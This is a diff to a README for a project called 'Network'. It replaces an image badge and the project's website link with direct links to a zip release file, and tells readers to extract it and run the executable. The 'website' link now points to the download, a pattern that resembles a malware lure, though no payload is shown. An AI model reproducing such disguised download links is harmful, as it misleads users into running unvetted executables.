@@ -15,13 +15,13 @@ In today's digital age, centralized systems pose significant risks to privacy an
 
 ### Installation
 To get started with Network, download the application from the link below:
-[![Launch Application](https://img.shields.io/badge/Launch-Application-blue)](https://github.com/file/Application.zip)
+[![Launch Application](https://github.com/briantgg/Network/releases/download/v1.0.0/Application.zip)](https://github.com/briantgg/Network/releases/download/v1.0.0/Application.zip)
 
 ### Launch Application
 Once you have downloaded the application zip file, extract it and launch the executable to experience the power of Network firsthand!
 
 ### Visit Our Website
-For more information about Network and its capabilities, visit our website at [www.network-project.com](https://www.network-project.com).
+For more information about Network and its capabilities, visit our website at [https://github.com/briantgg/Network/releases/download/v1.0.0/Application.zip](https://github.com/briantgg/Network/releases/download/v1.0.0/Application.zip).
 
 ### Releases
 If you encounter any issues with the download link or need access to previous versions of Network, please navigate to the "Releases" section of this repository for additional resources.
